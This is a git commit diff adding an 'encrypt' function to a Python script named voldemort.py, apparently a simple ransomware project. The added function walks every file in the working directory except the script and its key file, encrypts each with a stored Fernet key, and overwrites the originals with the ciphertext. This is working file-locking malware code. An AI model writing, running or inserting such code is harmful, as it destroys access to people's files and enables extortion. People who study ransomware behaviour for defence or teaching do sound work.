5324a359799e18d7c85601878311994b9a42a2a8
Alireza.Mandegar <57321058+alireza-mandegar@users.noreply.github.com>
2023-09-23 02:22:24 +0330

    encrypt function

--- voldemort.py
+++ voldemort.py
@@ -14,3 +14,23 @@ def key():
     with open("thekey.key", "wb") as thekey:
         thekey.write(key)
     print(f'{S} key generated!')
+
+def encrypt():
+    files = list()
+    for file in os.listdir():
+        if file  == "voldemort.py" or file == "thekey.key":
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+
+    print(files)
+
+    with open("thekey.key", "rb") as key:
+        secretkey = key.read()
+
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_encrypted = Fernet(secretkey).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
